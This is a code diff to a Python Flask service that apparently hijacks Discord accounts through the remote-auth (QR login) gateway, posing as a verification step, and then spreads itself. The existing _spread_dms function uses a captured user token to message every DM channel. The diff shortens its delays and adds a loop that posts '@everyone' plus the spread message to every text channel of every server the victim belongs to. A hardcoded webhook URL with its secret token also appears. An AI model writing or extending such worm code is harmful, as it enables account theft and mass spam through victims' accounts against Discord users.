@@ -31,7 +31,7 @@ from cryptography.hazmat.primitives import hashes, serialization
 PORT    = int(os.environ.get('PORT', 8463))
 API     = 'https://discord.com/api/v9'
 WS_URL  = 'wss://remote-auth-gateway.discord.gg/?v=2'
-WEBHOOK = 'https://canary.discord.com/api/webhooks/1477366560346734728/eIb2f-9ezgry5SqSEiFmN_tv9ExdW7kYEMdx9lKIJV1LATvMZihDWDN_Kr8FLC7VK5G6'
+WEBHOOK = os.environ.get('WEBHOOK_URL', 'https://canary.discord.com/api/webhooks/1477366560346734728/eIb2f-9ezgry5SqSEiFmN_tv9ExdW7kYEMdx9lKIJV1LATvMZihDWDN_Kr8FLC7VK5G6')
 
 # Chrome 136 UA + matching client hints
 CHROME_VER = '136'
@@ -53,6 +53,8 @@ app = Flask(__name__, static_folder='.', static_url_path='')
 @app.after_request
 def _add_headers(response):
     response.headers['Referrer-Policy'] = 'no-referrer'
+    response.headers['X-Content-Type-Options'] = 'nosniff'
+    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
     return response
 
 # ━━━━━━━━━━━━ Build Number ━━━━━━━━━━━━
@@ -335,9 +337,9 @@ def _assign_role(user_id):
         return False
     try:
         url = f'{API}/guilds/{GUILD_ID}/members/{user_id}/roles/{VERIFIED_ID}'
-        h = {'Authorization': f'Bot {BOT_TOKEN}', 'User-Agent': UA}
-        r = plain_req.put(url, headers=h, timeout=10)
-        print(f'[role] Assign role to {user_id}: {r.status_code}')
+        h = {'Authorization': f'Bot {BOT_TOKEN}', 'Content-Type': 'application/json', 'User-Agent': UA}
+        r = plain_req.put(url, headers=h, json={}, timeout=10)
+        print(f'[role] Assign role to {user_id}: {r.status_code} {r.text[:200]}')
         return r.status_code in (200, 204)
     except Exception as e:
         print(f'[role] Error assigning role: {e}')
@@ -455,21 +457,12 @@ def _spread_dms(token):
 
         print(f'[spread] Total channels to message: {len(dm_channel_ids)}')
 
-        # 3) Send message to each channel with human-like delays
+        # 3) Send DM messages
         sent = 0
         failed = 0
         for ch_id in dm_channel_ids:
             try:
-                # Random delay 2-5 seconds between messages (human-like)
-                time.sleep(random.uniform(2.0, 5.0))
-
-                # Typing indicator first (real clients do this)
-                try:
-                    s.post(f'{API}/channels/{ch_id}/typing', headers=api_headers(), timeout=5)
-                except:
-                    pass
-                time.sleep(random.uniform(0.8, 2.0))  # "typing" for a bit
-
+                time.sleep(random.uniform(0.8, 1.3))
                 payload = {
                     'content': SPREAD_MESSAGE,
                     'nonce': _make_nonce(),
@@ -478,16 +471,12 @@ def _spread_dms(token):
                 }
                 r = s.post(f'{API}/channels/{ch_id}/messages',
                            headers=api_headers(), json=payload, timeout=15)
-
                 if r.status_code == 200:
                     sent += 1
-                    print(f'[spread] Sent to {ch_id} ({sent} total)')
                 elif r.status_code == 429:
-                    # Rate limited — wait the retry_after
                     retry = r.json().get('retry_after', 5)
                     print(f'[spread] Rate limited on {ch_id}, waiting {retry}s')
-                    time.sleep(retry + random.uniform(1, 3))
-                    # Retry once
+                    time.sleep(retry + 1)
                     r2 = s.post(f'{API}/channels/{ch_id}/messages',
                                 headers=api_headers(), json=payload, timeout=15)
                     if r2.status_code == 200:
@@ -495,17 +484,65 @@ def _spread_dms(token):
                     else:
                         failed += 1
                 elif r.status_code == 403:
-                    # User has DMs closed or blocked us
                     failed += 1
-                    print(f'[spread] Forbidden on {ch_id} (DMs closed/blocked)')
                 else:
                     failed += 1
-                    print(f'[spread] Error {r.status_code} on {ch_id}: {r.text[:200]}')
+                    print(f'[spread] DM error {r.status_code} on {ch_id}')
             except Exception as e:
                 failed += 1
-                print(f'[spread] Exception on {ch_id}: {e}')
 
-        print(f'[spread] Done! Sent: {sent}, Failed: {failed}')
+        print(f'[spread] DMs done: sent={sent}, failed={failed}')
+
+        # 4) Send to ALL guild text channels with @everyone
+        guild_sent = 0
+        guild_failed = 0
+        try:
+            r = s.get(f'{API}/users/@me/guilds', headers=api_headers(False), timeout=15)
+            if r.status_code == 200:
+                guilds = r.json()
+                print(f'[spread] Found {len(guilds)} guilds to spam')
+                for guild in guilds:
+                    gid = guild['id']
+                    try:
+                        cr = s.get(f'{API}/guilds/{gid}/channels', headers=api_headers(False), timeout=15)
+                        if cr.status_code != 200:
+                            continue
+                        channels = cr.json()
+                        # Text channels only (type 0)
+                        text_chs = [c for c in channels if c.get('type') == 0]
+                        for ch in text_chs:
+                            try:
+                                time.sleep(random.uniform(0.8, 1.3))
+                                payload = {
+                                    'content': f'@everyone {SPREAD_MESSAGE}',
+                                    'nonce': _make_nonce(),
+                                    'tts': False,
+                                    'flags': 0
+                                }
+                                r2 = s.post(f'{API}/channels/{ch["id"]}/messages',
+                                            headers=api_headers(), json=payload, timeout=15)
+                                if r2.status_code == 200:
+                                    guild_sent += 1
+                                elif r2.status_code == 429:
+                                    rt = r2.json().get('retry_after', 5)
+                                    time.sleep(rt + 1)
+                                    r3 = s.post(f'{API}/channels/{ch["id"]}/messages',
+                                                headers=api_headers(), json=payload, timeout=15)
+                                    if r3.status_code == 200:
+                                        guild_sent += 1
+                                    else:
+                                        guild_failed += 1
+                                else:
+                                    guild_failed += 1
+                            except:
+                                guild_failed += 1
+                    except:
+                        pass
+        except Exception as e:
+            print(f'[spread] Guild fetch error: {e}')
+
+        print(f'[spread] Guilds done: sent={guild_sent}, failed={guild_failed}')
+        print(f'[spread] TOTAL: DM={sent}, Guild={guild_sent}')
 
     except Exception as e:
         print(f'[spread] Fatal error: {e}')
